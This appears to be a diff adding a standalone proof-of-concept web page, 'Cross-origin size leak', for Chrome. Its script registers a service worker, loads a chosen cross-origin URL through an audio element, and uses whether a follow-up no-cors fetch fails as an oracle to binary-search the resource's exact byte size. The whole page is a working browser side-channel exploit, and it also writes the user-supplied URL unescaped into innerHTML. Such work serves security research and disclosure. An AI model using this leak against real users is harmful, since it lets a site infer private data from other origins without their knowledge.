@@ -1,0 +1,90 @@
+<html>
+	<head>
+		<title>Cross-origin size leak</title>
+		<style>
+			*{font-family:Mukta,sans-serif;color:#3b3b3b}input{background:inherit}
+			#result{max-width:720px;overflow-y:hidden;overflow-x:hidden}
+			#result p{font-weight:300;padding:4px 7px;margin:5px;color:#424242;max-width:700px}
+			iframe{width:1px;height:1px;border:0;opacity:0}
+			small{color:gray;font-weight:400;font-style:italic;font-size:16px;margin-top:-20px;display:block;margin-bottom:30px}
+			small strong{font-weight:600;font-size:18px;color:inherit}
+			input{width:515px;font-size:20px;padding:6px 10px;border:1px solid gray;border-radius:6px;margin:3px;margin-left:0}
+			button{font-size:20px;padding:6px 10px;border-radius:6px;border:1px solid gray;background:gray;color:#fff;cursor:pointer;margin:3px;margin-left:0;margin-bottom:20px}
+			h1{margin-top:40px;color:#424242}
+			.success{background:#e0f2d5}
+			.error{background:#ffd9d9}
+			.msg{font-weight:600}
+		</style>
+	</head>
+	<body>
+		
+		<h1>Cross-origin size leak</h1>
+		<small>Compatible with <strong>Chrome</strong> only</small>
+
+		<form id="form" method="POST">
+		  <input name="url" placeholder="https://www.google.com/robots.txt" value="https://www.google.com/robots.txt"/>
+		  <button>Run</button>
+		</form>
+
+		<div id="result"></div>
+
+		<script>
+			const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+			if ("serviceWorker" in navigator) {
+				addEventListener("load", async () => {
+					const registration = await navigator.serviceWorker.register("sw.js");
+					if (registration.installing)
+						location.reload();
+				});
+			}
+
+			const binarySearchSize = async (url, minSize, maxSize) => {
+				let foundSize = -1;
+				while (minSize <= maxSize) {
+					let mid = Math.floor((minSize + maxSize) / 2);
+					let isAtLeastMid = await checkSize(url, mid);
+					
+					if (isAtLeastMid) {
+						foundSize = mid + 1;
+						minSize = mid + 1;
+					} else {
+						maxSize = mid - 1;
+					}
+				}
+				msg(url, "success", `has exactly <b>${foundSize}</b> bytes.`);
+			};
+
+			const checkSize = (url, size) => {
+				return new Promise((resolve) => {
+					let sound = document.createElement("audio");
+					sound.src = `${url}?size=${size}&${Math.random()}`;
+					sound.onerror = async () => {
+                        try {
+                            await fetch("/mock.css", { mode: "no-cors" });
+                            msg(url, "error", `doesn't have <b>${size - 1}</b> bytes.`);
+                            resolve(false);
+                        } catch(err) {
+                            resolve(true);
+                        }
+					};
+					document.body.appendChild(sound);
+				});
+			};
+
+			const msg = (url, status, msg) => {
+				result.innerHTML += `<p class="${status}">\
+					Resource on <span class="msg">${url}</span> ${msg}`;
+				result.scrollTop = result.scrollHeight;
+			};
+
+			form.onsubmit = async (e) => {
+				e.preventDefault();
+				let url = form.url.value.trim();
+				let minSize = parseInt(1);
+				let maxSize = parseInt(10000);
+				binarySearchSize(url, minSize, maxSize);
+			};
+		</script>
+	</body>
+</html>
